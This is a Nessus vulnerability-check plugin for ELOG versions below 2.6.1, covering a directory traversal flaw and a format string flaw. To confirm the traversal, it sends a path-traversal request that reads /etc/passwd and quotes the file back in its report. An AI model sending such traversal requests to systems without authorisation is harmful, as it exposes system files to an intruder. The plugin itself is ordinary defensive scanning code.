#
# (C) Tenable Network Security
#


 desc = "
Synopsis :

The remote web server is affected by multiple flaws. 

Description :

The remote host appears to be using ELOG, a web-based electronic
logbook application. 

The version of ELOG installed on the remote host fails to filter
directory traversal strings before processing GET requests.  An
attacker can exploit this issue to retrieve the contents of arbitrary
files from the remote host, subject to the privileges under which ELOG
runs. 

In addition, the application is reportedly affected by a format string
vulnerability in the 'write_logfile'.  Provided logging is enabled, an
attacker may be able to exploit this via the 'uname' parameter of the
login form to crash the application or execute arbitrary code
remotely. 

See also :

http://midas.psi.ch/elogs/Forum/1608

Solution : 

Upgrade to ELOG version 2.6.1 or later.

Risk factor : 

Low / CVSS Base Score : 2.3
(AV:R/AC:L/Au:NR/C:P/I:N/A:N/B:N)";


if (description) {
  script_id(20750);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2006-0347", "CVE-2006-0348");
  script_bugtraq_id(16315);
  script_xref(name:"OSVDB", value:"22646");
  script_xref(name:"OSVDB", value:"22647");
 
  script_name(english:"ELOG < 2.6.1 Multiple Vulnerabilities");
  script_summary(english:"Checks for multiple vulnerabilities in ELOG < 2.6.1");
 
  script_description(english:desc);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 8080);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:8080);
if (!get_port_state(port)) exit(0);


# If the server looks like ELOG...
banner = get_http_banner(port:port);
if (banner && "Server: ELOG HTTP" >< banner) {
  # Try to exploit the flaw to read /etc/passwd.
  req = http_get(item:"/../../../../../../../../../../etc/passwd", port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

  if (res && egrep(pattern:"root:.*:0:[01]:", string:res)) {
      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        res
      );

    security_note(port:port, data:report);
    exit(0);
  }
}
